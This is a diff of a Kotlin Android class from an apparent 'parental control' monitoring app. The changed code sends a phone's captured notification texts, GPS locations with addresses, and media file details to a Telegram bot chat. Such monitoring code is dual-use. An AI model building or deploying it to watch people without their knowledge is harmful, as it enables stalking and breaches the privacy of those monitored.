@@ -1,12 +1,9 @@
 package com.parentalcontrol.monitor.services
 
-import android.app.Service
 import android.content.Context
-import android.content.Intent
 import android.content.SharedPreferences
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
-import android.os.IBinder
 import com.parentalcontrol.monitor.api.TelegramApi
 import com.parentalcontrol.monitor.database.MonitoringDatabase
 import com.parentalcontrol.monitor.models.AppUsageData
@@ -20,38 +17,17 @@ import retrofit2.converter.gson.GsonConverterFactory
 import java.text.SimpleDateFormat
 import java.util.*
 
-class TelegramService : Service() {
-    
-    override fun onBind(intent: Intent?): IBinder? = null
+class TelegramService {
     
     private var telegramApi: TelegramApi? = null
     private var botToken: String? = null
     private var chatId: String? = null
+    private var context: Context? = null
     private var database: MonitoringDatabase? = null
     private val scope = CoroutineScope(Dispatchers.IO)
     
-    override fun onCreate() {
-        super.onCreate()
-        initialize(this)
-    }
-    
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        intent?.let {
-            when (it.getStringExtra("action")) {
-                "send_message" -> {
-                    val message = it.getStringExtra("message")
-                    if (message != null) {
-                        scope.launch {
-                            sendMessage(message)
-                        }
-                    }
-                }
-            }
-        }
-        return START_STICKY
-    }
-    
     fun initialize(context: Context) {
+        this.context = context
         this.database = MonitoringDatabase.getDatabase(context)
         val sharedPrefs = context.getSharedPreferences("telegram_config", Context.MODE_PRIVATE)
         botToken = sharedPrefs.getString("bot_token", null)
@@ -80,22 +56,47 @@ class TelegramService : Service() {
         if (!isOnline()) return
         
         database?.let { db ->
-            // Process pending telegram messages
-            val unsentMessages = db.monitoringDao().getUnsentMessages()
-            unsentMessages.forEach { message ->
-                scope.launch {
-                    try {
-                        val response = telegramApi?.sendMessage(
-                            chatId = message.chatId,
-                            text = message.message
-                        )
-                        if (response?.ok == true) {
-                            val updatedMessage = message.copy(sent = true)
-                            db.monitoringDao().updateTelegramMessage(updatedMessage)
-                        }
-                    } catch (e: Exception) {
-                        // Handle send error
-                    }
+            // Process pending notifications
+            val unsentNotifications = db.notificationDao().getUnsentNotifications()
+            unsentNotifications.forEach { notification ->
+                val success = sendNotificationAlert(
+                    notification.appName,
+                    notification.title,
+                    notification.text,
+                    notification.timestamp
+                )
+                if (success) {
+                    db.notificationDao().markAsSent(notification.id)
+                }
+            }
+            
+            // Process pending locations
+            val unsentLocations = db.locationDao().getUnsentLocations()
+            unsentLocations.forEach { location ->
+                val success = sendLocationUpdate(
+                    location.latitude,
+                    location.longitude,
+                    location.accuracy,
+                    location.address,
+                    location.timestamp
+                )
+                if (success) {
+                    db.locationDao().markAsSent(location.id)
+                }
+            }
+            
+            // Process pending media files
+            val unsentMediaFiles = db.mediaFileDao().getUnsentMediaFiles()
+            unsentMediaFiles.forEach { mediaFile ->
+                val success = sendMediaFileAlert(
+                    mediaFile.fileName,
+                    mediaFile.filePath,
+                    mediaFile.fileType,
+                    mediaFile.fileSize,
+                    mediaFile.dateAdded
+                )
+                if (success) {
+                    db.mediaFileDao().markAsSent(mediaFile.id)
                 }
             }
         }
@@ -244,11 +245,14 @@ class TelegramService : Service() {
         }
     }
     
-    suspend fun sendMessage(text: String): Boolean {
+    private suspend fun sendMessage(text: String): Boolean {
         return try {
             telegramApi?.sendMessage(
-                chatId = chatId!!,
-                text = text
+                TelegramMessage(
+                    chatId = chatId!!,
+                    text = text,
+                    parseMode = "HTML"
+                )
             )
             true
         } catch (e: Exception) {
@@ -258,17 +262,16 @@ class TelegramService : Service() {
     }
     
     private fun isOnline(): Boolean {
-        return try {
-            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        context?.let { ctx ->
+            val connectivityManager = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
             val network = connectivityManager.activeNetwork ?: return false
             val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
             
-            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+            return networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                     networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                     networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
-        } catch (e: Exception) {
-            false
         }
+        return false
     }
     
     private fun formatAppUsageMessage(usageData: List<AppUsageData>): String {
@@ -279,7 +282,7 @@ class TelegramService : Service() {
         builder.append("Time: ${getCurrentTimeString()}\n\n")
         
         usageData.forEach { data ->
-            val timeUsedMinutes = data.usageTime / (1000 * 60)
+            val timeUsedMinutes = data.timeUsed / (1000 * 60)
             val lastUsedTime = dateFormat.format(Date(data.lastTimeUsed))
             
             builder.append("📋 <b>${data.appName}</b>\n")
@@ -344,12 +347,6 @@ class TelegramService : Service() {
                 .putString("bot_token", botToken)
                 .putString("chat_id", chatId)
                 .apply()
-        }
-        
-        fun initialize(context: Context) {
-            // Start the service to initialize it
-            val intent = Intent(context, TelegramService::class.java)
-            context.startService(intent)
         }
         
         fun getTelegramConfig(context: Context): Pair<String?, String?> {
